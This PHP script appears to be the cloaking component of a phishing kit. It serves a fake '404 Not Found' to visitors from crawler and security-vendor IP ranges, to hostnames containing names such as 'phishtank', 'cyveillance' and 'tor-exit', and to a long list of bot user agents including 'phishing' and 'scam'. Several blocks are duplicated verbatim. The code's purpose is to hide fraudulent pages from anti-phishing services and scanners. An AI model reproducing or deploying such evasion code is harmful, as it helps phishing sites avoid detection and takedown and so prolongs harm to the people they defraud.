<?php
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
 "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^64.233.173.*" , "^64.68.90.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     // this is for exact matches of IP address in array
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     // this is for wild card matches
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}



$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}
if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
      }}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",

 "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",

"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",

"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",

"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^64.233.173.*" , "^64.68.90.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}
function is_bot() {
	#For Bot Spiders and Search Engines
    $spiders = array(
        "abot",
        "dbot",
        "ebot",
        "hbot",
        "kbot",
        "lbot",
        "mbot",
        "nbot",
        "obot",
        "pbot",
        "rbot",
        "sbot",
        "tbot",
        "vbot",
        "ybot",
        "zbot",
        "bot.",
        "bot/",
        "_bot",
        ".bot",
        "/bot",
        "-bot",
        ":bot",
        "(bot",
        "crawl",
        "slurp",
        "spider",
        "seek",
        "accoona",
        "acoon",
        "adressendeutschland",
        "ah-ha.com",
        "ahoy",
        "altavista",
        "ananzi",
        "anthill",
        "appie",
        "arachnophilia",
        "arale",
        "scam",
        "phishing",
        "araneo",
        "aranha",
        "architext",
        "aretha",
        "arks",
        "asterias",
        "atlocal",
        "atn",
        "atomz",
        "augurfind",
        "backrub",
        "bannana_bot",
        "baypup",
        "bdfetch",
        "big brother",
        "biglotron",
        "bjaaland",
        "blackwidow",
        "blaiz",
        "blog",
        "blo.",
        "bloodhound",
        "boitho",
        "booch",
        "bradley",
        "butterfly",
        "calif",
        "cassandra",
        "ccubee",
        "cfetch",
        "charlotte",
        "churl",
        "cienciaficcion",
        "cmc",
        "collective",
        "comagent",
        "combine",
        "computingsite",
        "csci",
        "curl",
        "cusco",
        "daumoa",
        "deepindex",
        "delorie",
        "depspid",
        "deweb",
        "die blinde kuh",
        "digger",
        "ditto",
        "dmoz",
        "docomo",
        "download express",
        "dtaagent",
        "dwcp",
        "ebiness",
        "ebingbong",
        "e-collector",
        "ejupiter",
        "emacs-w3 search engine",
        "esther",
        "evliya celebi",
        "ezresult",
        "falcon",
        "felix ide",
        "ferret",
        "fetchrover",
        "fido",
        "findlinks",
        "fireball",
        "fish search",
        "fouineur",
        "funnelweb",
        "gazz",
        "gcreep",
        "genieknows",
        "getterroboplus",
        "geturl",
        "glx",
        "goforit",
        "golem",
        "grabber",
        "grapnel",
        "gralon",
        "griffon",
        "gromit",
        "grub",
        "gulliver",
        "hamahakki",
        "harvest",
        "havindex",
        "helix",
        "heritrix",
        "hku www octopus",
        "homerweb",
        "htdig",
        "html index",
        "html_analyzer",
        "htmlgobble",
        "hubater",
        "hyper-decontextualizer",
        "ia_archiver",
        "ibm_planetwide",
        "ichiro",
        "iconsurf",
        "iltrovatore",
        "image.kapsi.net",
        "imagelock",
        "incywincy",
        "indexer",
        "infobee",
        "informant",
        "ingrid",
        "inktomisearch.com",
        "inspector web",
        "intelliagent",
        "internet shinchakubin",
        "ip3000",
        "iron33",
        "israeli-search",
        "ivia",
        "jack",
        "jakarta",
        "javabee",
        "jetbot",
        "jumpstation",
        "katipo",
        "kdd-explorer",
        "kilroy",
        "knowledge",
        "kototoi",
        "kretrieve",
        "labelgrabber",
        "lachesis",
        "larbin",
        "legs",
        "libwww",
        "linkalarm",
        "link validator",
        "linkscan",
        "lockon",
        "lwp",
        "lycos",
        "magpie",
        "mantraagent",
        "mapoftheinternet",
        "marvin/",
        "mattie",
        "mediafox",
        "mediapartners",
        "mercator",
        "merzscope",
        "microsoft url control",
        "minirank",
        "miva",
        "mj12",
        "mnogosearch",
        "moget",
        "monster",
        "moose",
        "motor",
        "multitext",
        "muncher",
        "muscatferret",
        "mwd.search",
        "myweb",
        "najdi",
        "nameprotect",
        "nationaldirectory",
        "nazilla",
        "ncsa beta",
        "nec-meshexplorer",
        "nederland.zoek",
        "netcarta webmap engine",
        "netmechanic",
        "netresearchserver",
        "netscoop",
        "newscan-online",
        "phishing",
        "nhse",
        "nokia6682/",
        "nomad",
        "noyona",
        "nutch",
        "nzexplorer",
        "objectssearch",
        "occam",
        "omni",
        "open text",
        "openfind",
        "openintelligencedata",
        "orb search",
        "osis-project",
        "pack rat",
        "pageboy",
        "pagebull",
        "page_verifier",
        "panscient",
        "parasite",
        "partnersite",
        "patric",
        "pear.",
        "pegasus",
        "peregrinator",
        "pgp key agent",
        "phantom",
        "phpdig",
        "picosearch",
        "piltdownman",
        "pimptrain",
        "pinpoint",
        "pioneer",
        "piranha",
        "plumtreewebaccessor",
        "pogodak",
        "poirot",
        "pompos",
        "poppelsdorf",
        "poppi",
        "popular iconoclast",
        "psycheclone",
        "publisher",
        "python",
        "rambler",
        "raven search",
        "roach",
        "road runner",
        "roadhouse",
        "robbie",
        "robofox",
        "robozilla",
        "rules",
        "salty",
        "sbider",
        "scooter",
        "scoutjet",
        "scrubby",
        "search.",
        "searchprocess",
        "semanticdiscovery",
        "senrigan",
        "sg-scout",
        "shai'hulud",
        "shark",
        "shopwiki",
        "sidewinder",
        "sift",
        "silk",
        "simmany",
        "site searcher",
        "site valet",
        "sitetech-rover",
        "skymob.com",
        "sleek",
        "smartwit",
        "sna-",
        "snappy",
        "snooper",
        "sohu",
        "speedfind",
        "sphere",
        "sphider",
        "spinner",
        "spyder",
        "steeler/",
        "suke",
        "suntek",
        "supersnooper",
        "surfnomore",
        "sven",
        "sygol",
        "szukacz",
        "tach black widow",
        "tarantula",
        "templeton",
        "/teoma",
        "t-h-u-n-d-e-r-s-t-o-n-e",
        "theophrastus",
        "titan",
        "titin",
        "tkwww",
        "toutatis",
        "t-rex",
        "tutorgig",
        "twiceler",
        "twisted",
        "ucsd",
        "udmsearch",
        "url check",
        "updated",
        "vagabondo",
        "valkyrie",
        "verticrawl",
        "victoria",
        "vision-search",
        "volcano",
        "voyager/",
        "voyager-hc",
        "w3c_validator",
        "w3m2",
        "w3mir",
        "walker",
        "wallpaper",
        "wanderer",
        "wauuu",
        "wavefire",
        "web core",
        "web hopper",
        "web wombat",
        "webbandit",
        "webcatcher",
        "webcopy",
        "webfoot",
        "weblayers",
        "weblinker",
        "weblog monitor",
        "webmirror",
        "webmonkey",
        "webquest",
        "webreaper",
        "websitepulse",
        "websnarf",
        "webstolperer",
        "webvac",
        "webwalk",
        "webwatch",
        "webwombat",
        "webzinger",
        "wget",
        "whizbang",
        "whowhere",
        "wild ferret",
        "worldlight",
        "wwwc",
        "wwwster",
        "xenu",
        "xget",
        "xift",
        "xirq",
        "yandex",
        "yanga",
        "yeti",
        "yodao","zao/","zippp","zyborg");
    foreach($spiders as $spider) {
        if ( stripos($_SERVER['HTTP_USER_AGENT'], $spider) !== false ) return true;
    }
    return false;
}
if (is_bot()) {
    header('HTTP/1.0 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

?>